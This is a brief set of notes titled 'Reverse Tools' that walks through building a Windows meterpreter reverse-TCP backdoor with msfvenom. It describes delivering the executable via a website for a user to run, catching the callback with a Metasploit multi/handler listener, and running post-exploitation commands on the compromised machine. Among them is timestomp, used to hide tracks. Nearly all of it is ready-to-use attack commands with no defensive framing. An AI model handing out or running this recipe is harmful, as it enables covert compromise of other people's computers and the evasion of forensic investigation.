Reverse Tools
    To create payloads to make a backdoor on the windows machine
        mfsvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.117 LPORT=1234 --format=exe > attack.exe
            serve it on a website or somewhere to deliver it to the user to run it on his machine :)
            this tool do only as an agent to establish a new TCP connection to the operation center to get commands and run on the machine and nothing more. so that will be a tiny file.
        listen on the operation center before run it on the user machine via metasploit (msfconsole)
            db_status
            use exploit/multi/handler
            set payload windows/meterpreter/reverse_tcp
            set LHOST=192.168.0.117
            set LPORT=1234
            exploit -j -z
                run in background to listen to establish connection from user machine.
        after a new connection established, you can run different commands on the user machine like:
            sessions -i
                to see all sessions that is connected to the listener
            sessions -i 1
                to connect to the first session
            ipconfig
                get NIC configuration details
            sysinfo
                get system information
            getuid
                get user info
            dir
            cd
            timestomp myfile.txt
                to change last access/modified file attributes to cover and hide tracking :)
